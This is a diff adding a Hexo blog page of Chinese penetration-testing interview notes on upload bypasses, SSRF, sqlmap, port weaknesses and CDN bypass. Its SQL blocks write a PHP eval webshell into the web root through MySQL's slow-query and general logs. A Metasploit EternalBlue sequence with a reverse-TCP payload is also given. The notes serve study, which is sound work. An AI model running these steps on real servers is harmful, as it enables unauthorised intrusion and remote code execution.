@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="文件上传有哪些绕过方式总结一些文件上传的绕过方法 - FreeBuf网络安全行业门户  文件扩展名：大小写、双写（pphphp）、 双拓展名（.php.jpg）、%00截断、  文件内容：文件头、  http协议层：content-type、  服务器解析漏洞：apache解析漏洞（shell.php.xxx）、IIS解析漏洞（shell.asp;.jpg）、nginx畸形文件名（shell.jp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/07/09/%E9%9D%A2%E7%BB%8F/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件上传有哪些绕过方式总结一些文件上传的绕过方法 - FreeBuf网络安全行业门户  文件扩展名：大小写、双写（pphphp）、 双拓展名（.php.jpg）、%00截断、  文件内容：文件头、  http协议层：content-type、  服务器解析漏洞：apache解析漏洞（shell.php.xxx）、IIS解析漏洞（shell.asp;.jpg）、nginx畸形文件名（shell.jp">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-07-09T12:46:44.117Z">
+<meta property="article:modified_time" content="2025-07-09T12:47:00.864Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2025/07/09/%E9%9D%A2%E7%BB%8F/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title> | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/09/%E9%9D%A2%E7%BB%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-07-09 20:46:44 / Modified: 20:47:00" itemprop="dateCreated datePublished" datetime="2025-07-09T20:46:44+08:00">2025-07-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="文件上传有哪些绕过方式"><a href="#文件上传有哪些绕过方式" class="headerlink" title="文件上传有哪些绕过方式"></a>文件上传有哪些绕过方式</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/433766.html">总结一些文件上传的绕过方法 - FreeBuf网络安全行业门户</a></p>
+<ul>
+<li><p>文件扩展名：大小写、双写（pphphp）、 双拓展名（.php.jpg）、%00截断、</p>
+</li>
+<li><p>文件内容：文件头、</p>
+</li>
+<li><p>http协议层：content-type、</p>
+</li>
+<li><p>服务器解析漏洞：apache解析漏洞（shell.php.xxx）、IIS解析漏洞（shell.asp;.jpg）、nginx畸形文件名（shell.jpg&#x2F;.php）</p>
+</li>
+<li><p>前端：js禁用、修改文件名</p>
+</li>
+<li><p>.htaccess修改解析方式（防御禁止上传.htaccess）user.ini</p>
+</li>
+<li><p>竞争条件攻击</p>
+</li>
+</ul>
+<h4 id="csrf与ssrf的区别"><a href="#csrf与ssrf的区别" class="headerlink" title="csrf与ssrf的区别"></a>csrf与ssrf的区别</h4><p>ssrf：服务器请求伪造攻击</p>
+<pre><code> 危害：内网端口扫描、读取本地文件（file://协议）、gopher协议攻击
+</code></pre>
+<p>​	 防御：限制请求的目标地址、</p>
+<p>csrf：跨站请求伪造</p>
+<h4 id="常见的中间件漏洞"><a href="#常见的中间件漏洞" class="headerlink" title="常见的中间件漏洞"></a>常见的中间件漏洞</h4><blockquote>
+<p>IIS：PUT漏洞、短文件名猜解、远程代码执行、解析漏洞等<br>Apache：解析漏洞、目录遍历等<br>Nginx:文件解析、目录遍历、CRLF注入、目录穿越等<br>Tomcat:远程代码执行、war后门文件部署等<br>JBoss:反序列化漏洞、war后门文件部署等<br>WebLogic:反序列化漏洞、SSRF任意文件上传、war后门文件部署等</p>
+</blockquote>
+<h4 id="sqlmap利用流程"><a href="#sqlmap利用流程" class="headerlink" title="sqlmap利用流程"></a>sqlmap利用流程</h4><p>探测注入点通过 -u ，探测用户-is_dba</p>
+<p>或者通过抓包，使用 -r</p>
+<p>有注入点，则依次通过-t -c -dump 来爆破，或直接-beach</p>
+<p>可以使用编写的脚本 –tamper</p>
+<h4 id="mysql-getshell的几种方法"><a href="#mysql-getshell的几种方法" class="headerlink" title="mysql_getshell的几种方法"></a>mysql_getshell的几种方法</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/carmi/p/18410869">https://www.cnblogs.com/carmi/p/18410869</a></p>
+<ol>
+<li>mysql的os_shell</li>
+</ol>
+<p><strong>利用原理</strong></p>
+<p>–os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件。此为sqlmap的一个命令，利用这条命令的先决条件：</p>
+<ul>
+<li>要求为数据库DBA，使用<code>--is-dba</code>查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba</li>
+<li>secure_file_priv没有具体值</li>
+<li>知道网站的绝对路径</li>
+</ul>
+<ol start="2">
+<li>慢日志getshell</li>
+</ol>
+<p>慢日志：一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值(默认为10秒)，这个查询语句将被记录到慢查询日志中。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查看系统默认的时间值</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%long_query_time%&#x27;</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%long%&#x27;</span></span><br><span class="line">#查看慢日志参数</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span></span><br><span class="line">#慢日志getshell</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span> 		# 打开慢日志</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpStudy\\WWW\\test.php&#x27;</span>	# 慢日志的路径【注意：一定要用双反斜杠】</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="keyword">or</span> sleep(<span class="number">11</span>)		# 这儿<span class="number">11</span>是超过慢日志的<span class="number">10</span>秒时间</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="3">
+<li>日志<code>general_log</code>getshell</li>
+</ol>
+<p>MySQL的General Log是一个记录MySQL服务器活动的日志，它记录了客户端连接和断开的信息，以及从客户端收到的每个SQL语句。这个日志在调试客户端错误时非常有用，因为它可以精确地显示客户端发送给MySQL服务器的内容。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#相关参数一共有<span class="number">3</span>个：general_log、log_output、general_log_file</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general_log&#x27;</span>;   # 查看日志是否开启</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;   # 开启日志功能</span><br><span class="line"> </span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general_log_file&#x27;</span>;    # 看看日志文件保存位置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;   # 设置日志文件保存位置</span><br><span class="line"> </span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;log_output&#x27;</span>;  <span class="comment">-- 看看日志输出类型  table或file</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> log_output<span class="operator">=</span><span class="string">&#x27;table&#x27;</span>; <span class="comment">-- 设置输出类型为 table</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> log_output<span class="operator">=</span><span class="string">&#x27;file&#x27;</span>;   <span class="comment">-- 设置输出类型为file</span></span><br><span class="line">#一般log_output都是file,就是将日志存入文件中。<span class="keyword">table</span>的话就是将日志存入数据库的日志表中</span><br><span class="line"></span><br><span class="line">#general_log getshell</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>pwd<span class="string">&#x27;]);?&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"># 测试</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>ip<span class="operator">/</span>shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="4">
+<li>into_outfile getshell</li>
+</ol>
+<p>对web目录需要有写权限能够使用单引号(root)<br>知道网站绝对路径(phpinfo&#x2F;php探针&#x2F;通过报错等)<br>secure_file_priv为空</p>
+<ol start="5">
+<li>远程加载getshell</li>
+</ol>
+<p><strong>获取网站根目录方式</strong></p>
+<ol>
+<li>phpinfo()页面：最理想的情况，直接显示web路径</li>
+<li>web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径（单引号、参数报错）</li>
+<li>一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以猜测默认路径或者通过查看数据库保存的路径、配置文件路径等。</li>
+<li>搜索引擎、利用其他漏洞、中间件错误解析等</li>
+</ol>
+<h4 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h4><p>WAF</p>
+<p>IDS入侵检测系统</p>
+<p>IPS入侵防御系统</p>
+<p>VPN</p>
+<p>漏洞扫描设备</p>
+<p>防火墙</p>
+<p>安全隔离网闸、流量监控设备、防病毒网关</p>
+<h4 id="常见的端口漏洞"><a href="#常见的端口漏洞" class="headerlink" title="常见的端口漏洞"></a>常见的端口漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">21 FTP 匿名未授权访问 爆破</span><br><span class="line">22 ssh root密码爆破 后门用户 可以google查一些关于ssh后门的文章 里面的默认密码，可能会登入进去</span><br><span class="line">23 telnet 一般会发生在 路由器 或者交换机 嵌入式设备 管理端口 攻击方法 弱口令</span><br><span class="line">25 smtp 默认用户 默认密码 邮件账号爆破</span><br><span class="line">80 http 常见的Owasp top 10 中间件反序列化 中间件溢出 fastcgi配置不当，造成fastcgi端口泄露</span><br><span class="line">443 https openssl 心脏滴血（影响范围较小） SSL/TLS低版本存在的漏洞</span><br><span class="line">3389</span><br><span class="line">3306</span><br><span class="line">8080</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119614618">【工具使用】——Metasploit(MSF)使用详解(超详细)-CSDN博客</a></p>
+<p>利用msf17-010</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole										    #进入框架</span><br><span class="line">search  ms17_010                                    # 使用search命令查找相关漏洞</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块</span><br><span class="line">info     										    #使用info查看模块信息</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷</span><br><span class="line">show options    									#查看模块需要配置的参数</span><br><span class="line">set  RHOST  192.168.100.158    					    #设置参数</span><br><span class="line">exploit / run     								    #攻击</span><br><span class="line">后渗透阶段											#后渗透阶段</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="给你一个url，你会如何进行漏洞挖掘？"><a href="#给你一个url，你会如何进行漏洞挖掘？" class="headerlink" title="给你一个url，你会如何进行漏洞挖掘？"></a>给你一个url，你会如何进行漏洞挖掘？</h4><p>信息收集：url -&gt; 域名 子域名爆破 ip 旁站 c段 端口扫描 指纹识别（cms） 、中间件</p>
+<p>​                   whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p>
+<p>​                   目录扫描、</p>
+<p>漏洞挖掘：根据信息收集的结果，看是否有未授权、敏感信息、cms等</p>
+<p>​                   查看网站功能：登录框，评论区等黑盒测试</p>
+<p>权限提升等</p>
+<h4 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_60571842/article/details/131639567">CDN绕过技巧(全面)-CSDN博客</a></p>
+<p>CDN (内容分发网络) 指的是一组分布在各个地区的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">服务器</a>。这些服务器存储着数据的副本，因此服务器可以根据哪些服务器与用户距离最近，来满足数据的请求。CDN 提供快速服务，较少受高流量影响。</p>
+<p>用超级ping工具，若目标存在多个IP的话，很有可能采用了CDN服务</p>
+<p>绕过：-邮件服务查询、遗留文件、子域名查询、国外地址查询、黑暗引擎搜索特定文件（fofa）、DNS 历史记录</p>
+<h4 id="mysql5-0版本前后有什么区别"><a href="#mysql5-0版本前后有什么区别" class="headerlink" title="mysql5.0版本前后有什么区别"></a>mysql5.0版本前后有什么区别</h4>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/04/vulhub%E4%B8%8B%E8%BD%BD%E5%8F%8A%E4%BD%BF%E7%94%A8/" rel="prev" title="vulhub下载及使用">
+      <i class="fa fa-chevron-left"></i> vulhub下载及使用
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%89%E5%93%AA%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">文件上传有哪些绕过方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#csrf%E4%B8%8Essrf%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">2.</span> <span class="nav-text">csrf与ssrf的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">常见的中间件漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">sqlmap利用流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-getshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="nav-number">5.</span> <span class="nav-text">mysql_getshell的几种方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="nav-number">6.</span> <span class="nav-text">安全设备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.</span> <span class="nav-text">常见的端口漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf"><span class="nav-number">8.</span> <span class="nav-text">msf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AAurl%EF%BC%8C%E4%BD%A0%E4%BC%9A%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%EF%BC%9F"><span class="nav-number">9.</span> <span class="nav-text">给你一个url，你会如何进行漏洞挖掘？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cdn%E7%BB%95%E8%BF%87"><span class="nav-number">10.</span> <span class="nav-text">cdn绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql5-0%E7%89%88%E6%9C%AC%E5%89%8D%E5%90%8E%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="nav-number">11.</span> <span class="nav-text">mysql5.0版本前后有什么区别</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
